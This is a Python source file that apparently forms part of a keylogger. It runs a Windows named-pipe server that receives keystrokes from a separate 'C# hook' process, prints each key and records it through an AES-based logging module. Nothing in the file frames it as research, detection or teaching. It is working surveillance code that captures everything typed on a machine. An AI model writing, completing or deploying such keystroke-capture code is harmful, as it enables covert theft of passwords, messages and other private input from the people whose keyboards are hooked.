import win32pipe
import win32file
from aes_logger import log_keystroke

PIPE_NAME = r'\\.\pipe\JarbleLogPipe'

def start_pipe_server():
    print("Starting Python pipe server for live logging...")
    pipe = win32pipe.CreateNamedPipe(
        PIPE_NAME,
        win32pipe.PIPE_ACCESS_INBOUND,
        win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_WAIT,
        1, 65536, 65536,
        0, None
    )
    win32pipe.ConnectNamedPipe(pipe, None)
    print("C# hook connected to log pipe.")

    try:
        while True:
            result, data = win32file.ReadFile(pipe, 64*1024)
            if data:
                message = data.decode().strip()
                print("Received key:", message)
                log_keystroke(message)
    except Exception as e:
        print("Pipe error:", e)
    finally:
        win32file.CloseHandle(pipe)

if __name__ == '__main__':
    start_pipe_server()